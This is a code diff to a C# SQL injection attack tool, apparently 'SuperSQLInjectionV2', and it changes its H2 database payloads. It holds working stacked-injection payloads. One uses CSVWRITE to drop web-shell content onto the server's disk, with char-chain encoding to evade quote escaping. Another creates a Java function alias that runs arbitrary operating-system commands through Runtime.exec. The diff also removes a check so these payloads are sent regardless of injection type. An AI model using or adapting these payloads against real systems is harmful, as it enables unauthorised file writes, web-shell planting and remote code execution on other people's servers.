@@ -1054,14 +1054,15 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
         }
 
         /// <summary>
-        /// H2 CSVWRITE写文件：第3参数null+writeColumnHeader=false不写表头；
-        /// 内容与内层查询串全部char链编码，彻底规避引号转义问题
+        /// H2 CSVWRITE写文件：第3参数options传 writeColumnHeader=false fieldDelimiter=（不写表头+空字段包裹符→裸字节落盘，
+        /// 实测H2 2.x常量折叠会把列名写成'值'当表头，fieldDelimiter默认双引号会破坏shell内容）；
+        /// 内容与内层查询串全部char链编码，彻底规避引号转义问题。文件末尾会多一个CRLF行尾（CSV行终止符，PHP/JSP可容忍）。
         /// </summary>
         private static async Task WriteFileByH2(AppConfig config, FileCmdViewModel vm)
         {
             string Enc(string s) => TextCodec.StrToChrOrChar(s, "char", "||", "UTF-8");
             string innerSelect = "select " + Enc(vm.FileContent);
-            string payload = " 1=1;call csvwrite(" + Enc(vm.FilePath) + "," + Enc(innerSelect) + ",null," + Enc("writeColumnHeader=false") + ");--";
+            string payload = " 1=1;call csvwrite(" + Enc(vm.FilePath) + "," + Enc(innerSelect) + "," + Enc("writeColumnHeader=false fieldDelimiter=") + ");--";
             await SendPayload(config, payload).ConfigureAwait(false);
             Log.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
         }
@@ -1494,8 +1495,8 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
         {
             if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked))
             {
-                Log.Warning("H2 CREATE ALIAS命令执行需要堆叠注入（创建Java函数别名）！");
-                return;
+                //H2 JDBC单execute可执行多语句（CommandList），堆叠能力与注入点类型无关（同PG UDF策略：尝试发送而非直接拒绝）
+                Log.Warning("提示：当前注入点非堆叠类型，CREATE ALIAS仍以堆叠形式尝试发送（H2驱动支持单请求多语句时可用）！");
             }
             try
             {
@@ -1505,7 +1506,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                     string javaSrc = "String sqx(String cmd) throws Exception { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() : \"\"; }";
                     await SendPayload(config, " 1=1;drop alias if exists SQX;create alias SQX as $$" + javaSrc + "$$;-- ").ConfigureAwait(false);
                     _h2AliasReady = true;
-                    Log.Show("H2 CREATE ALIAS函数SQX已创建（需H2 1.x且JDK编译器可用；H2 2.x已移除内联编译，此方式不可用）！");
+                    Log.Show("H2 CREATE ALIAS函数SQX已创建（需JDK编译器可用：javax.tools.JavaCompiler，JRE/精简运行环境不可用；实测H2 1.4与2.x均支持）！");
                 }
                 //命令char链编码规避引号；别名函数可直接在表达式中引用
                 string chain = TextCodec.StrToChrOrChar(vm.CmdText, "char", "||", "UTF-8");
